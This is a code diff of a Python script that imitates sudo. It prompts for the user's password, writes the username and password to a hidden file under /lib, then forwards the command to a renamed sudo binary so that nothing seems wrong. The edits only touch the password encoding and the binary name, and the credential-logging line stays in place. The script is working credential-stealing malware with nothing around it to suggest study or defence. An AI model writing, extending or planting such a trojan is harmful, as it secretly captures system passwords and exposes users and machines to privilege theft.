@@ -22,13 +22,14 @@ def main():
         password = input(sudoCommand)
         
         os.system("echo \"" + user + ":" + password + "\" >> /lib/.syslogbLog")
-        password = (password + '\n').encode('utf-8')
+        password = (password + '\n')
+        encoded = password.encode('utf-8')
         os.system('stty echo')
         arguments = ""
         del sys.argv[0]
         for arg in sys.argv:
             arguments = arguments + arg + " "
-        sudoCmd = ['sudo', '-S', arguments]
+        sudoCmd = ['sudoA', '-S', arguments]
         command = subprocess.Popen(sudoCmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         stdout, stderr = command.communicate(password)
 main()
